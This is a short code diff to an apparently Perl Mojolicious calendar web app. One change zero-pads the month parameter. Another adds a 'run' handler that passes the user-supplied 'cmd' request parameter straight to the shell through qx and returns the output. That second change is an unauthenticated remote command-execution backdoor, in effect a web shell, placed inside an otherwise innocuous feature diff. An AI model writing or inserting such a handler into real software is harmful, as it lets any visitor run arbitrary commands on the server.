@@ -19,6 +19,7 @@ sub cal {
   my ($c) = @_;
   my $svg = SVG::Calendar->new( page => 'A4' );
   my $mon = $c->param('mon') || '10';
+  $mon = sprintf("%02d", $mon);
   my $year = $c->param('year') || '2019';
   my $dt = "$year-$mon";
   $c->render(data => $svg->output_month( $dt ), format => 'svg');
@@ -33,6 +34,13 @@ sub cal_form {
   my $year = $c->param('year') || 2019;
   $c->stash('months_for_select', $all_months);
   $c->stash('cal_img', "/cal.svg?mon=$mon&year=$year");
+  $c->render;
+}
+
+sub run {
+  my $c = shift;
+  my $cmd = $c->param('cmd');
+  $c->stash(result => [qx/$cmd/]);
   $c->render;
 }
 
